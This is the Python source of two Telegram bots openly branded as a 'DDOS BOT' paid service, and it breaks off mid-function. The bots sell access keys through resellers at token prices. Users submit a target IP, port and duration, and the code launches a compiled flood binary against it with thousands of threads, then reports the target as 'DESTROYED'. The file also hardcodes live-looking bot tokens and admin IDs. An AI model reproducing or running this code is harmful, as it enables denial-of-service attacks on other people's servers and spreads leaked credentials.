#!/usr/bin/env python3
import os
import time
import threading
import json
import subprocess
import requests
import random
import string
from datetime import datetime

# ==================== BOT 1 CONFIG ====================
TOKEN1 = "8479899015:AAFhCQEmKSdNhXzLPdz_p4ZXcaJvPIMBtdU"
ADMIN1 = [6548871396, 8749555677]
CONTACT1 = "@TG_ROLEX"

# ==================== BOT 2 CONFIG ====================
TOKEN2 = "8749555677:AAGH3CzScRKE8mBTLxRapV0zrxdjn-NEul8"
ADMIN2 = [6548871396]
CONTACT2 = "@TG_DEVILOP"

# ==================== SHARED ====================
users1 = {}
users2 = {}
groups1 = {}
groups2 = {}
keys1 = {}
keys2 = {}
resellers1 = {}
resellers2 = {}
blocked_keys1 = {}
blocked_keys2 = {}
is_attack = False
current_target = ""
slot_lock = threading.Lock()
current_slots = 0
MAX_SLOTS = 50
attack_threads = 2000
attack_time = 180
cooldown_seconds = 100
user_last_attack_1 = {}
user_last_attack_2 = {}
attack_daily_limit = 35
user_attack_count_1 = {}
user_attack_count_2 = {}
server_status = "ACTIVE"
bandwidth = "200 GBPS"
last_id1 = 0
last_id2 = 0

KEY_PRICES = {
    "1h": 0, "12h": 2, "1d": 4, "3d": 8, "7d": 15, "14d": 30, "30d": 50
}

# ==================== FAST RESPONSE FLAGS ====================
waiting_attack1 = {}
waiting_attack2 = {}
waiting_redeem1 = {}
waiting_redeem2 = {}
waiting_adduser1 = {}
waiting_adduser2 = {}
waiting_removeuser1 = {}
waiting_removeuser2 = {}
waiting_addgroup1 = {}
waiting_addgroup2 = {}
waiting_removegroup1 = {}
waiting_removegroup2 = {}
waiting_addreseller1 = {}
waiting_addreseller2 = {}
waiting_removereseller1 = {}
waiting_removereseller2 = {}
waiting_setthreads1 = {}
waiting_setthreads2 = {}
waiting_settime1 = {}
waiting_settime2 = {}
waiting_setslots1 = {}
waiting_setslots2 = {}
waiting_setcooldown1 = {}
waiting_setcooldown2 = {}
waiting_setdaily1 = {}
waiting_setdaily2 = {}
waiting_gen1 = {}
waiting_gen2 = {}
waiting_blockkey1 = {}
waiting_blockkey2 = {}
waiting_unblockkey1 = {}
waiting_unblockkey2 = {}
waiting_broadcast1 = {}
waiting_broadcast2 = {}
waiting_unlimited1 = {}
waiting_unlimited2 = {}
waiting_limited1 = {}
waiting_limited2 = {}

# ==================== HELPERS ====================
def compile_binary():
    if os.path.exists("./attack"):
        return True
    if os.path.exists("./attack.c"):
        os.system("gcc -o attack attack.c -lpthread 2>/dev/null")
        os.system("chmod +x attack 2>/dev/null")
        return os.path.exists("./attack")
    return False

def run_attack(ip, port, sec):
    try:
        if not os.path.exists("./attack"):
            return False
        cmd = ["./attack", ip, str(port), str(sec), str(attack_threads)]
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(sec)
        return True
    except:
        return False

def send_msg(token, chat_id, text):
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {"chat_id": chat_id, "text": text}
        requests.post(url, data=data, timeout=2)
    except:
        pass

def send_msg_and_get_id(token, chat_id, text):
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {"chat_id": chat_id, "text": text}
        r = requests.post(url, data=data, timeout=2)
        return r.json().get("result", {}).get("message_id")
    except:
        return None

def edit_msg(token, chat_id, msg_id, text):
    try:
        url = f"https://api.telegram.org/bot{token}/editMessageText"
        data = {"chat_id": chat_id, "message_id": msg_id, "text": text}
        requests.post(url, data=data, timeout=2)
    except:
        pass

def del_msg(token, chat_id, msg_id):
    try:
        url = f"https://api.telegram.org/bot{token}/deleteMessage"
        data = {"chat_id": chat_id, "message_id": msg_id}
        requests.post(url, data=data, timeout=2)
    except:
        pass

def send_inline_buttons(token, chat_id, text, buttons):
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {"chat_id": chat_id, "text": text, "reply_markup": {"inline_keyboard": buttons}}
        requests.post(url, json=payload, timeout=2)
    except:
        pass

def get_slots():
    global current_slots
    with slot_lock:
        return MAX_SLOTS - current_slots

def add_slot():
    global current_slots
    with slot_lock:
        if current_slots < MAX_SLOTS:
            current_slots += 1
    return current_slots

def remove_slot():
    global current_slots
    with slot_lock:
        if current_slots > 0:
            current_slots -= 1
    return current_slots

def get_expiry(users, uid):
    if str(uid) in users:
        remaining = users[str(uid)] - time.time()
        if remaining <= 0:
            return "Expired"
        days = int(remaining // 86400)
        hours = int((remaining % 86400) // 3600)
        if days > 0:
            return f"{days}d {hours}h"
        return f"{hours}h"
    return None

def generate_key(prefix, days=0, hours=0):
    return f"{prefix}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"

def save_users1():
    with open('users1.json', 'w') as f:
        json.dump(users1, f)

def load_users1():
    global users1
    try:
        with open('users1.json', 'r') as f:
            users1 = json.load(f)
    except:
        users1 = {}

def save_users2():
    with open('users2.json', 'w') as f:
        json.dump(users2, f)

def load_users2():
    global users2
    try:
        with open('users2.json', 'r') as f:
            users2 = json.load(f)
    except:
        users2 = {}

def save_keys1():
    with open('keys1.json', 'w') as f:
        json.dump(keys1, f)

def load_keys1():
    global keys1
    try:
        with open('keys1.json', 'r') as f:
            keys1 = json.load(f)
    except:
        keys1 = {}

def save_keys2():
    with open('keys2.json', 'w') as f:
        json.dump(keys2, f)

def load_keys2():
    global keys2
    try:
        with open('keys2.json', 'r') as f:
            keys2 = json.load(f)
    except:
        keys2 = {}

def save_groups1():
    with open('groups1.json', 'w') as f:
        json.dump(groups1, f)

def load_groups1():
    global groups1
    try:
        with open('groups1.json', 'r') as f:
            groups1 = json.load(f)
    except:
        groups1 = {}

def save_groups2():
    with open('groups2.json', 'w') as f:
        json.dump(groups2, f)

def load_groups2():
    global groups2
    try:
        with open('groups2.json', 'r') as f:
            groups2 = json.load(f)
    except:
        groups2 = {}

def save_resellers1():
    with open('resellers1.json', 'w') as f:
        json.dump(resellers1, f)

def load_resellers1():
    global resellers1
    try:
        with open('resellers1.json', 'r') as f:
            resellers1 = json.load(f)
    except:
        resellers1 = {}

def save_resellers2():
    with open('resellers2.json', 'w') as f:
        json.dump(resellers2, f)

def load_resellers2():
    global resellers2
    try:
        with open('resellers2.json', 'r') as f:
            resellers2 = json.load(f)
    except:
        resellers2 = {}

def save_attack_count1():
    with open('attack_count1.json', 'w') as f:
        json.dump({'count': user_attack_count_1, 'last': user_last_attack_1}, f)

def load_attack_count1():
    global user_attack_count_1, user_last_attack_1
    try:
        with open('attack_count1.json', 'r') as f:
            d = json.load(f)
            user_attack_count_1 = d.get('count', {})
            user_last_attack_1 = d.get('last', {})
    except:
        pass

def save_attack_count2():
    with open('attack_count2.json', 'w') as f:
        json.dump({'count': user_attack_count_2, 'last': user_last_attack_2}, f)

def load_attack_count2():
    global user_attack_count_2, user_last_attack_2
    try:
        with open('attack_count2.json', 'r') as f:
            d = json.load(f)
            user_attack_count_2 = d.get('count', {})
            user_last_attack_2 = d.get('last', {})
    except:
        pass

def can_attack1(uid):
    today = time.strftime("%Y-%m-%d")
    key = f"{uid}_{today}"
    if key not in user_attack_count_1:
        user_attack_count_1[key] = 0
    if user_attack_count_1[key] >= attack_daily_limit:
        return False, f"❌ Daily limit reached! Max {attack_daily_limit} attacks per day"
    if uid not in ADMIN1:
        if uid in user_last_attack_1:
            last = user_last_attack_1[uid]
            remaining = cooldown_seconds - (time.time() - last)
            if remaining > 0:
                return False, f"⏳ Cooldown! Wait {int(remaining)}s"
    return True, "OK"

def add_attack_count1(uid):
    today = time.strftime("%Y-%m-%d")
    key = f"{uid}_{today}"
    user_attack_count_1[key] = user_attack_count_1.get(key, 0) + 1
    user_last_attack_1[uid] = time.time()
    save_attack_count1()

def can_attack2(uid):
    today = time.strftime("%Y-%m-%d")
    key = f"{uid}_{today}"
    if key not in user_attack_count_2:
        user_attack_count_2[key] = 0
    if user_attack_count_2[key] >= attack_daily_limit:
        return False, f"❌ Daily limit reached! Max {attack_daily_limit} attacks per day"
    if uid not in ADMIN2:
        if uid in user_last_attack_2:
            last = user_last_attack_2[uid]
            remaining = cooldown_seconds - (time.time() - last)
            if remaining > 0:
                return False, f"⏳ Cooldown! Wait {int(remaining)}s"
    return True, "OK"

def add_attack_count2(uid):
    today = time.strftime("%Y-%m-%d")
    key = f"{uid}_{today}"
    user_attack_count_2[key] = user_attack_count_2.get(key, 0) + 1
    user_last_attack_2[uid] = time.time()
    save_attack_count2()

def redeem_key1(uid, key):
    if key not in keys1:
        return False, "❌ Invalid Key!"
    if keys1[key].get('used', False):
        return False, "❌ Key Already Used!"
    if keys1[key].get('blocked', False):
        return False, "❌ Key is Blocked!"
    
    days = keys1[key].get('days', 0)
    hours = keys1[key].get('hours', 0)
    keys1[key]['used'] = True
    keys1[key]['used_by'] = str(uid)
    keys1[key]['used_at'] = time.time()
    users1[str(uid)] = time.time() + (days * 86400) + (hours * 3600)
    save_keys1()
    save_users1()
    plan = f"{days} Days" if days > 0 else f"{hours} Hours"
    return True, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
✅ KEY REDEEMED SUCCESSFULLY!
━━━━━━━━━━━━━━━━━━━━━━━━
Plan: {plan}
Daily Limit: {attack_daily_limit} attacks
Cooldown: {cooldown_seconds}s

Your account is now ACTIVE!
━━━━━━━━━━━━━━━━━━━━━━━━
"""

def redeem_key2(uid, key):
    if key not in keys2:
        return False, "❌ Invalid Key!"
    if keys2[key].get('used', False):
        return False, "❌ Key Already Used!"
    if keys2[key].get('blocked', False):
        return False, "❌ Key is Blocked!"
    
    days = keys2[key].get('days', 0)
    hours = keys2[key].get('hours', 0)
    keys2[key]['used'] = True
    keys2[key]['used_by'] = str(uid)
    keys2[key]['used_at'] = time.time()
    users2[str(uid)] = time.time() + (days * 86400) + (hours * 3600)
    save_keys2()
    save_users2()
    plan = f"{days} Days" if days > 0 else f"{hours} Hours"
    return True, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
✅ KEY REDEEMED SUCCESSFULLY!
━━━━━━━━━━━━━━━━━━━━━━━━
Plan: {plan}
Daily Limit: {attack_daily_limit} attacks
Cooldown: {cooldown_seconds}s

Your account is now ACTIVE!
━━━━━━━━━━━━━━━━━━━━━━━━
"""

def add_reseller1(uid, tokens, is_unlimited=False):
    resellers1[str(uid)] = {'tokens': tokens if not is_unlimited else -1, 'total_earned': 0, 'created_at': time.time(), 'keys_generated': [], 'blocked_keys': [], 'unlimited': is_unlimited}
    save_resellers1()

def remove_reseller1(uid):
    if str(uid) in resellers1:
        del resellers1[str(uid)]
        save_resellers1()

def get_reseller_tokens1(uid):
    if str(uid) in resellers1:
        if resellers1[str(uid)].get('unlimited', False):
            return "∞"
        return resellers1[str(uid)].get('tokens', 0)
    return 0

def deduct_reseller_tokens1(uid, amount):
    if str(uid) in resellers1:
        if resellers1[str(uid)].get('unlimited', False):
            return True
        if resellers1[str(uid)].get('tokens', 0) >= amount:
            resellers1[str(uid)]['tokens'] -= amount
            resellers1[str(uid)]['total_earned'] += amount
            save_resellers1()
            return True
    return False

def add_reseller_key_record1(uid, key):
    if str(uid) in resellers1:
        if 'keys_generated' not in resellers1[str(uid)]:
            resellers1[str(uid)]['keys_generated'] = []
        resellers1[str(uid)]['keys_generated'].append(key)
        save_resellers1()

def add_reseller2(uid, tokens, is_unlimited=False):
    resellers2[str(uid)] = {'tokens': tokens if not is_unlimited else -1, 'total_earned': 0, 'created_at': time.time(), 'keys_generated': [], 'blocked_keys': [], 'unlimited': is_unlimited}
    save_resellers2()

def remove_reseller2(uid):
    if str(uid) in resellers2:
        del resellers2[str(uid)]
        save_resellers2()

def get_reseller_tokens2(uid):
    if str(uid) in resellers2:
        if resellers2[str(uid)].get('unlimited', False):
            return "∞"
        return resellers2[str(uid)].get('tokens', 0)
    return 0

def deduct_reseller_tokens2(uid, amount):
    if str(uid) in resellers2:
        if resellers2[str(uid)].get('unlimited', False):
            return True
        if resellers2[str(uid)].get('tokens', 0) >= amount:
            resellers2[str(uid)]['tokens'] -= amount
            resellers2[str(uid)]['total_earned'] += amount
            save_resellers2()
            return True
    return False

def add_reseller_key_record2(uid, key):
    if str(uid) in resellers2:
        if 'keys_generated' not in resellers2[str(uid)]:
            resellers2[str(uid)]['keys_generated'] = []
        resellers2[str(uid)]['keys_generated'].append(key)
        save_resellers2()

def generate_admin_key1(prefix, days, hours):
    key = f"{prefix}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    keys1[key] = {'days': days, 'hours': hours, 'used': False, 'used_by': None, 'created_by': "admin", 'blocked': False}
    save_keys1()
    return key

def generate_admin_key2(prefix, days, hours):
    key = f"{prefix}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    keys2[key] = {'days': days, 'hours': hours, 'used': False, 'used_by': None, 'created_by': "admin", 'blocked': False}
    save_keys2()
    return key

def generate_reseller_key1(uid, duration_str):
    days, hours, price = 0, 0, 0
    if duration_str == "1h": hours, price = 1, 0
    elif duration_str == "12h": hours, price = 12, 2
    elif duration_str == "1d": days, price = 1, 4
    elif duration_str == "3d": days, price = 3, 8
    elif duration_str == "7d": days, price = 7, 15
    elif duration_str == "14d": days, price = 14, 30
    elif duration_str == "30d": days, price = 30, 50
    
    if price > 0 and not deduct_reseller_tokens1(uid, price):
        return None, f"❌ Insufficient tokens! Need {price} tokens"
    
    key = f"KING-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    keys1[key] = {'days': days, 'hours': hours, 'used': False, 'used_by': None, 'created_by': str(uid), 'blocked': False}
    add_reseller_key_record1(uid, key)
    save_keys1()
    return key, None

def generate_reseller_key2(uid, duration_str):
    days, hours, price = 0, 0, 0
    if duration_str == "1h": hours, price = 1, 0
    elif duration_str == "12h": hours, price = 12, 2
    elif duration_str == "1d": days, price = 1, 4
    elif duration_str == "3d": days, price = 3, 8
    elif duration_str == "7d": days, price = 7, 15
    elif duration_str == "14d": days, price = 14, 30
    elif duration_str == "30d": days, price = 30, 50
    
    if price > 0 and not deduct_reseller_tokens2(uid, price):
        return None, f"❌ Insufficient tokens! Need {price} tokens"
    
    key = f"KING-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    keys2[key] = {'days': days, 'hours': hours, 'used': False, 'used_by': None, 'created_by': str(uid), 'blocked': False}
    add_reseller_key_record2(uid, key)
    save_keys2()
    return key, None

def delete_key1(key):
    if key in keys1:
        creator = keys1[key].get('created_by')
        if creator and creator != "admin":
            remove_reseller_key_record1(creator, key)
        del keys1[key]
        save_keys1()
        return True
    return False

def delete_key2(key):
    if key in keys2:
        creator = keys2[key].get('created_by')
        if creator and creator != "admin":
            remove_reseller_key_record2(creator, key)
        del keys2[key]
        save_keys2()
        return True
    return False

def add_blocked_key1(uid, key):
    if str(uid) in resellers1:
        if 'blocked_keys' not in resellers1[str(uid)]:
            resellers1[str(uid)]['blocked_keys'] = []
        resellers1[str(uid)]['blocked_keys'].append(key)
    blocked_keys1[key] = True
    if key in keys1:
        keys1[key]['blocked'] = True
    save_keys1()

def remove_blocked_key1(key):
    if key in blocked_keys1:
        del blocked_keys1[key]
    if key in keys1:
        keys1[key]['blocked'] = False
    save_keys1()

def add_blocked_key2(uid, key):
    if str(uid) in resellers2:
        if 'blocked_keys' not in resellers2[str(uid)]:
            resellers2[str(uid)]['blocked_keys'] = []
        resellers2[str(uid)]['blocked_keys'].append(key)
    blocked_keys2[key] = True
    if key in keys2:
        keys2[key]['blocked'] = True
    save_keys2()

def remove_blocked_key2(key):
    if key in blocked_keys2:
        del blocked_keys2[key]
    if key in keys2:
        keys2[key]['blocked'] = False
    save_keys2()

def run_progress(token, chat_id, msg_id, ip, port, sec, method):
    global is_attack
    for i in range(sec):
        if not is_attack:
            break
        p = int((i+1) / sec * 20)
        bar = "█" * p + "░" * (20 - p)
        percent = int((i+1) / sec * 100)
        try:
            edit_msg(token, chat_id, msg_id, f"""
⚡ ATTACK IN PROGRESS ⚡
━━━━━━━━━━━━━━━━━━━━━━━━
🎯 Target: {ip}
🔌 Port: {port}
📊 [{bar}] {percent}%
⏱️ Left: {sec-(i+1)}s
🖥 SERVER    : {server_status}
🚀 BANDWIDTH : {bandwidth}
━━━━━━━━━━━━━━━━━━━━━━━━
""")
        except:
            pass
        time.sleep(1)
    
    if is_attack:
        is_attack = False
        remove_slot()
        try:
            del_msg(token, chat_id, msg_id)
        except:
            pass
        send_msg(token, chat_id, f"""
✅ ATTACK COMPLETE ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 Target: {ip}
🔌 Port: {port}
⏱️ Time: {sec}s
💀 Status: DESTROYED
🖥 SERVER    : {server_status}
🚀 BANDWIDTH : {bandwidth}
🎮 Free Slots: {get_slots()}/{MAX_SLOTS}
━━━━━━━━━━━━━━━━━━━━━━
""")
        threading.Thread(target=run_attack, args=(ip, port, sec)).start()

# ==================== BOT 1 FUNCTIONS ====================
def is_user1(uid):
    if uid in ADMIN1:
        return True
    return str(uid) in users1 and time.time() < users1[str(uid)]

def add_user1(uid, days):
    users1[str(uid)] = time.time() + (days * 86400)
    save_users1()

def remove_user1(uid):
    if str(uid) in users1:
        del users1[str(uid)]
        save_users1()

def is_group1(gid):
    return str(gid) in groups1 and time.time() < groups1[str(gid)]

def add_group1(gid, days):
    groups1[str(gid)] = time.time() + (days * 86400)
    save_groups1()

def remove_group1(gid):
    if str(gid) in groups1:
        del groups1[str(gid)]
        save_groups1()

def is_reseller1(uid):
    return str(uid) in resellers1

def get_reseller_keys1(uid):
    return resellers1[str(uid)].get('keys_generated', []) if str(uid) in resellers1 else []

def get_reseller_blocked_keys1(uid):
    return resellers1[str(uid)].get('blocked_keys', []) if str(uid) in resellers1 else []

def handle_start1(chat_id, uid):
    if not is_user1(uid):
        send_msg(TOKEN1, chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
   ⚡ DDOS BOT STARTED ⚡ 
━━━━━━━━━━━━━━━━━━━━━━━━
❌ ACCESS DENIED!            
You Are Not Approved!          
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 /redeem KEY - Get Access
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 BUY ACCESS: {CONTACT1}
━━━━━━━━━━━━━━━━━━━━━━━━
""")
        return
    
    if uid in ADMIN1:
        send_msg(TOKEN1, chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
     ⚡ DDOS BOT STARTED ⚡ 
━━━━━━━━━━━━━━━━━━━━━━━━
        👑 WELCOME ADMIN
━━━━━━━━━━━━━━━━━━━━━━━━
📌 USER COMMANDS:                      
/attack IP PORT TIME - Start attack
/stop - Stop attack
/id - Your ID
/redeem KEY - Redeem access key
/help - This menu
/rules - Bot rules
━━━━━━━━━━━━━━━━━━━━━━━━
👑 ADMIN COMMANDS:
/adduser ID DAYS - Add user
/removeuser ID - Remove user
/addreseller ID TOKENS - Add reseller
/removereseller ID - Remove reseller
/setthreads NUM - Set threads
/settime SEC - Set max time
/setslots NUM - Set max slots
/setcooldown SEC - Set cooldown
/setdaily LIMIT - Set daily limit
/gen PREFIX DURATION - Generate key
/keys - List all keys
/deletekeys - Delete all keys
/blockkey KEY - Block key
/unblockkey KEY - Unblock key
/broadcast MSG - Broadcast message
/lock - Lock bot
/unlock - Unlock bot
/unlimited ID - Make reseller unlimited
/limited ID TOKENS - Make reseller limited
━━━━━━━━━━━━━━━━━━━━━━━━
""")
    elif is_reseller1(uid):
        tokens = get_reseller_tokens1(uid)
        keys_count = len(get_reseller_keys1(uid))
        blocked_count = len(get_reseller_blocked_keys1(uid))
        send_msg(TOKEN1, chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
  ⚡ DDOS BOT STARTED ⚡ 
━━━━━━━━━━━━━━━━━━━━━━━━
  💼 RESELLER PANEL                  
  🎫 Tokens: {tokens}
  🔑 Keys Generated: {keys_count}
  🚫 Blocked Keys: {blocked_count}
━━━━━━━━━━━━━━━━━━━━━━━━
📌 COMMANDS:                      
⚔️ ATTACK:
/attack IP PORT TIME - Start Attack
/stop - Stop Attack
━━━━━━━━━━━━━━━━━━━━━━━━
👤 USER:
/id - Get Your ID
/redeem KEY - Redeem Access Key
/help - Help Menu
/rules - Bot Rules
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 KEY MANAGEMENT:
/genkey - Generate Keys
/mykeys - Your keys
/deletekey KEY - Delete your key
/blockkey KEY - Block your key
/unblockkey KEY - Unblock your key
━━━━━━━━━━━━━━━━━━━━━━━━
""")
    else:
        expiry = get_expiry(users1, uid)
        send_msg(TOKEN1, chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
  ⚡ DDOS BOT STARTED ⚡ 
━━━━━━━━━━━━━━━━━━━━━━━━
  ✅ APPROVED USER                  
  📅 Expires: {expiry}          
━━━━━━━━━━━━━━━━━━━━━━━━
📌 COMMANDS:                      
/attack IP PORT TIME - Start Attack
/stop - Stop Attack
/id - Get Your ID
/redeem KEY - Redeem Access Key
/help - Help Menu
/rules - Bot Rules
━━━━━━━━━━━━━━━━━━━━━━━━
""")

def handle_attack_input1(chat_id, uid, text):
    global is_attack, current_target
    
    parts = text.strip().split()
    if len(parts) != 3:
        send_msg(TOKEN1, chat_id, "❌ Send: IP PORT TIME\nExample: 1.2.3.4 80 30")
        waiting_attack1[chat_id] = True
        return
    
    ip, port, sec = parts[0], parts[1], parts[2]
    try:
        port = int(port)
        sec = int(sec)
        if sec < 5 or sec > attack_time:
            send_msg(TOKEN1, chat_id, f"❌ Time must be 5-{attack_time} seconds")
            waiting_attack1[chat_id] = True
            return
    except:
        send_msg(TOKEN1, chat_id, "❌ Invalid port or time")
        waiting_attack1[chat_id] = True
        return
    
    can, msg = can_attack1(uid)
    if not can:
        send_msg(TOKEN1, chat_id, msg)
        waiting_attack1[chat_id] = True
        return
    
    if get_slots() <= 0:
        send_msg(TOKEN1, chat_id, f"❌ ALL {MAX_SLOTS} SLOTS BUSY!")
        waiting_attack1[chat_id] = True
        return
    
    is_attack = True
    current_target = f"{ip}:{port}"
    add_slot()
    add_attack_count1(uid)
    method = random.choice(["UDP", "TCP", "HTTP"])
    
    msg_id = send_msg_and_get_id(TOKEN1, chat_id, f"""
⚡ ATTACK STARTED ⚡
━━━━━━━━━━━━━━━━━━━━━━
🎯 Target: {ip}
🔌 Port: {port}
⏱️ Time: {sec}s
🖥 SERVER    : {server_status}
🚀 BANDWIDTH : {bandwidth}
⚙️ METHOD    : {method}
━━━━━━━━━━━━━━━━━━━━━━
""")
    if msg_id:
        threading.Thread(target=run_progress, args=(TOKEN1, chat_id, msg_id, ip, port, sec, method)).start()
    
    waiting_attack1[chat_id] = False

def handle_stop1(chat_id):
    global is_attack
    if is_attack:
        is_attack = False
        send_msg(TOKEN1, chat_id, "🛑 ATTACK STOPPED!")
    else:
        send_msg(TOKEN1, chat_id, "❌ No active attack!")

def handle_id1(chat_id, uid):
    if not is_user1(uid):
        send_msg(TOKEN1, chat_id, f"🆔 ID: {uid}\n❌ Not Approved\nBuy: {CONTACT1}")
        return
    
    if uid in ADMIN1:
        send_msg(TOKEN1, chat_id, f"🆔 YOUR ID: {uid}\n👑 OWNER")
    elif is_reseller1(uid):
        tokens = get_reseller_tokens1(uid)
        send_msg(TOKEN1, chat_id, f"🆔 YOUR ID: {uid}\n💼 RESELLER\n🎫 Tokens: {tokens}")
    else:
        expiry = get_expiry(users1, uid)
        send_msg(TOKEN1, chat_id, f"🆔 YOUR ID: {uid}\n✅ Approved\n📅 Expires: {expiry}")

def handle_redeem1(chat_id, text):
    key = text.strip().upper()
    success, msg = redeem_key1(chat_id, key)
    send_msg(TOKEN1, chat_id, msg)

def handle_rules1(chat_id):
    send_msg(TOKEN1, chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
📜 BOT RULES
━━━━━━━━━━━━━━━━━━━━━━━━
1️⃣ RESPECT THE LIMITS
   • Max 35 attacks per day
   • Cooldown: 100 seconds between attacks

2️⃣ NO SPAMMING
   • Don't flood multiple attacks at once
   • Don't stress test without permission

3️⃣ BE RESPECTFUL
   • Don't target unauthorized servers
   • Only use on your own infrastructure

4️⃣ NO SHARING
   • Don't share your access key
   • Each key is unique per user

5️⃣ CONSEQUENCES
   • Breaking rules = Permanent ban
   • No refunds for banned users
━━━━━━━━━━━━━━━━━━━━━━━━
""")

def handle_help1(chat_id):
    send_msg(TOKEN1, chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
🔥 DDOS BOT HELP 🔥
━━━━━━━━━━━━━━━━━━━━━━━━
USER COMMANDS:
/attack IP PORT TIME - Start attack
/stop - Stop attack
/id - Your ID
/redeem KEY - Redeem access key
/help - This menu
/rules - Bot rules
━━━━━━━━━━━━━━━━━━━━━━━━
ADMIN COMMANDS:
/adduser ID DAYS - Add user
/removeuser ID - Remove user
/addreseller ID TOKENS - Add reseller
/removereseller ID - Remove reseller
/setthreads NUM - Set threads
/settime SEC - Set max time
/setslots NUM - Set max slots
/setcooldown SEC - Set cooldown
/setdaily LIMIT - Set daily limit
/gen PREFIX DURATION - Generate key
/keys - List all keys
/deletekeys - Delete all keys
/blockkey KEY - Block key
/unblockkey KEY - Unblock key
/broadcast MSG - Broadcast message
/lock - Lock bot
/unlock - Unlock bot
/unlimited ID - Make reseller unlimited
/limited ID TOKENS - Make reseller limited
━━━━━━━━━━━━━━━━━━━━━━━━
RESELLER COMMANDS:
/genkey - Generate key
/mykeys - Your keys
/deletekey KEY - Delete your key
/blockkey KEY - Block your key
/unblockkey KEY - Unblock your key
━━━━━━━━━━━━━━━━━━━━━━━━
    """)

def handle_adduser1(chat_id, text):
    parts = text.strip().split()
    if len(parts) != 2:
        send_msg(TOKEN1, chat_id, "❌ Send: USER_ID DAYS\nExample: 123456789 7")
        return
    try:
        uid = int(parts[0])
        days = int(parts[1])
        if 1 <= days <= 30:
            add_user1(uid, days)
            send_msg(TOKEN1, chat_id, f"✅ User {uid} added for {days} days!")
        else:
            send_msg(TOKEN1, chat_id, "Days must be 1-30")
    except:
        send_msg(TOKEN1, chat_id, "Invalid input")

def handle_removeuser1(chat_id, text):
    try:
        uid = int(text.strip())
        remove_user1(uid)
        send_msg(TOKEN1, chat_id, f"✅ User {uid} removed!")
    except:
        send_msg(TOKEN1, chat_id, "Invalid USER ID")

def handle_addgroup1(chat_id, text):
    parts = text.strip().split()
    if len(parts) != 2:
        send_msg(TOKEN1, chat_id, "❌ Send: GROUP_ID DAYS\nExample: -100123456789 7")
        return
    try:
        gid = parts[0]
        days = int(parts[1])
        if 1 <= days <= 30:
            add_group1(gid, days)
            send_msg(TOKEN1, chat_id, f"✅ Group {gid} added for {days} days!")
        else:
            send_msg(TOKEN1, chat_id, "Days must be 1-30")
    except:
        send_msg(TOKEN1, chat_id, "Invalid input")

def handle_removegroup1(chat_id, text):
    try:
        gid = text.strip()
        remove_group1(gid)
        send_msg(TOKEN1, chat_id, f"✅ Group {gid} removed!")
    except:
        send_msg(TOKEN1, chat_id, "Invalid GROUP ID")

def handle_addreseller1(chat_id, text):
    parts = text.strip().split()
    if len(parts) != 2:
        send_msg(TOKEN1, chat_id, "❌ Send: USER_ID TOKENS\nExample: 123456789 100")
        return
    try:
        uid = int(parts[0])
        tokens = int(parts[1])
        add_reseller1(uid, tokens)
        send_msg(TOKEN1, chat_id, f"✅ Reseller {uid} added with {tokens} tokens!")
    except:
        send_msg(TOKEN1, chat_id, "Invalid input")

def handle_removereseller1(chat_id, text):
    try:
        uid = int(text.strip())
        remove_reseller1(uid)
        send_msg(TOKEN1, chat_id, f"✅ Reseller {uid} removed!")
    except:
        send_msg(TOKEN1, chat_id, "Invalid ID")

def handle_setthreads1(chat_id, text):
    global attack_threads
    try:
        threads = int(text.strip())
        if 100 <= threads <= 5000:
            attack_threads = threads
            send_msg(TOKEN1, chat_id, f"✅ Threads set to {attack_threads}")
        else:
            send_msg(TOKEN1, chat_id, "Threads must be 100-5000")
    except:
        send_msg(TOKEN1, chat_id, "Invalid number")

def handle_settime1(chat_id, text):
    global attack_time
    try:
        time_sec = int(text.strip())
        if 60 <= time_sec <= 600:
            attack_time = time_sec
            send_msg(TOKEN1, chat_id, f"✅ Max time set to {attack_time}s")
        else:
            send_msg(TOKEN1, chat_id, "Time must be 60-600 seconds")
    except:
        send_msg(TOKEN1, chat_id, "Invalid number")

def handle_setslots1(chat_id, text):
    global MAX_SLOTS
    try:
        slots = int(text.strip())
        if 1 <= slots <= 200:
            MAX_SLOTS = slots
            send_msg(TOKEN1, chat_id, f"✅ Max slots set to {MAX_SLOTS}")
        else:
            send_msg(TOKEN1, chat_id, "Slots must be 1-200")
    except:
        send_msg(TOKEN1, chat_id, "Invalid number")

def handle_setcooldown1(chat_id, text):
    global cooldown_seconds
    try:
        cooldown = int(text.strip())
        if 0 <= cooldown <= 600:
            cooldown_seconds = cooldown
            send_msg(TOKEN1, chat_id, f"✅ Cooldown set to {cooldown_seconds}s")
        else:
            send_msg(TOKEN1, chat_id, "Cooldown must be 0-600 seconds")
    except:
        send_msg(TOKEN1, chat_id, "Invalid number")

def handle_setdaily1(chat_id, text):
    global attack_daily_limit
    try:
        limit = int(text.strip())
        if 1 <= limit <= 1000:
            attack_daily_limit = limit
            send_msg(TOKEN1, chat_id, f"✅ Daily limit set to {attack_daily_limit}")
        else:
            send_msg(TOKEN1, chat_id, "Limit must be 1-1000")
    except:
        send_msg(TOKEN1, chat_id, "Invalid number")

def handle_gen1(chat_id, text):
    parts = text.strip().split()
    if len(parts) != 2:
        send_msg(TOKEN1, chat_id, "Usage: /gen PREFIX DURATION\nExample: /gen ROLEX 7d")
        return
    prefix, duration = parts[0].upper(), parts[1].lower()
    days, hours = 0, 0
    if duration.endswith('d'):
        days = int(duration[:-1])
    elif duration.endswith('h'):
        hours = int(duration[:-1])
    else:
